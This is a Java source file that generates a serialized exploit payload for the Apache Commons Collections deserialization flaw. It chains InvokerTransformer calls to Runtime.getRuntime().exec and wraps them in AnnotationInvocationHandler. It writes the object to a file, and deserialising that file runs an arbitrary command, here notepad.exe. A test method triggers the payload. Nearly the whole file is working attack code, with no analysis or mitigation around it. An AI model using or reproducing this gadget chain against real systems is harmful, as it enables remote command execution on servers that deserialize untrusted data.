package tfm;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import java.util.Map.Entry;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

public class Command_Deserialization {
	public static Object Cmd_Payload(String execArgs) throws Exception {
		final Transformer[] transforms = new Transformer[] {
				new ConstantTransformer(Runtime.class),
				new InvokerTransformer("getMethod", new Class[] { String.class,
						Class[].class }, new Object[] { "getRuntime",
						new Class[0] }),
				new InvokerTransformer("invoke", new Class[] { Object.class,
						Object[].class }, new Object[] { null, new Object[0] }),
				new InvokerTransformer("exec", new Class[] { String.class },
						new String[] { execArgs }), new ConstantTransformer(1) }; // ??

		Transformer transformerChain = new ChainedTransformer(transforms);
		Map innermap = new HashMap();
		innermap.put("value", "value");
		Map outmap = TransformedMap.decorate(innermap, null, transformerChain);

		Class cls = Class
				.forName("sun.reflect.annotation.AnnotationInvocationHandler");
		Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class);
		ctor.setAccessible(true);
		Object instance = ctor.newInstance(Retention.class, outmap);
		return instance;

	}

	public static void main(String[] args) throws Exception {
		GeneratePayload(Cmd_Payload("notepad.exe"),
				"d:/test.bin");
		//payloadTest("d:/test.bin");
	}

	public static void GeneratePayload(Object instance, String file)
			throws Exception {
		File f = new File(file);
		ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream(f));
		out.writeObject(instance);
		out.flush();
		out.close();
	}

	public static void payloadTest(String file) throws Exception {
		// 这里为测试上面的tansform是否会触发payload
		// Map.Entry onlyElement =(Entry) outmap.entrySet().iterator().next();
		// onlyElement.setValue("foobar");
		
		ObjectInputStream in = new ObjectInputStream(new FileInputStream(file));
		in.readObject();
		in.close();
	}
}




